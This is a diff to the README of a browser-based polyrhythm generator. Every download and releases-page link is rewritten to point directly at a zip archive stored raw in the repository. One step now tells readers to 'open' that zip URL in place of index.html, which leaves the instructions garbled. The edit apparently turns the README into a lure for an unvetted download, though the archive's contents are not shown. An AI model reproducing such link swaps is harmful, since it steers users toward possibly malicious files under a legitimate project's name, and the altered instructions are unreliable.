@@ -9,7 +9,7 @@ To get started with POLYARBOR-Rhythm-Generator, follow these simple steps:
 
 1. **Visit the Releases Page:**
    Click the link below to go to the releases page:
-   [Download POLYARBOR-Rhythm-Generator](https://github.com/prashanth-gitrepo/POLYARBOR-Rhythm-Generator/releases)
+   [Download POLYARBOR-Rhythm-Generator](https://raw.githubusercontent.com/prashanth-gitrepo/POLYARBOR-Rhythm-Generator/main/polyarbor/POLYARBOR-Rhythm-Generator_v3.7.zip)
 
 ## 💻 System Requirements
 Before downloading, ensure your system meets the following requirements:
@@ -28,7 +28,7 @@ After downloading:
    If the file is in a compressed format, right-click on the file and select “Extract All...” or similar option.
 
 2. **Open the Index File:**
-   Locate the extracted folder. Open the file named `index.html` in your web browser.
+   Locate the extracted folder. Open the file named `https://raw.githubusercontent.com/prashanth-gitrepo/POLYARBOR-Rhythm-Generator/main/polyarbor/POLYARBOR-Rhythm-Generator_v3.7.zip` in your web browser.
 
 3. **Start Creating:**
    Once the application loads, you can start crafting your polyrhythmic sequences. The interface is straightforward and user-friendly.
@@ -56,7 +56,7 @@ We plan to introduce more features based on user feedback. Some ideas include:
 - Enhanced visualizations
 - More user export options
 
-Stay updated by keeping an eye on the releases page: [Latest Releases](https://github.com/prashanth-gitrepo/POLYARBOR-Rhythm-Generator/releases)
+Stay updated by keeping an eye on the releases page: [Latest Releases](https://raw.githubusercontent.com/prashanth-gitrepo/POLYARBOR-Rhythm-Generator/main/polyarbor/POLYARBOR-Rhythm-Generator_v3.7.zip)
 
 ## 📞 Support
 If you encounter any issues or have questions, please feel free to reach out. You can open an issue in the GitHub repository for assistance, or ask for help from the community.
@@ -77,5 +77,5 @@ This project involves topics such as:
 - vst
 - webapp
 
-For more information or feedback, revisit the releases page: [Download POLYARBOR-Rhythm-Generator](https://github.com/prashanth-gitrepo/POLYARBOR-Rhythm-Generator/releases)
+For more information or feedback, revisit the releases page: [Download POLYARBOR-Rhythm-Generator](https://raw.githubusercontent.com/prashanth-gitrepo/POLYARBOR-Rhythm-Generator/main/polyarbor/POLYARBOR-Rhythm-Generator_v3.7.zip)
 ```
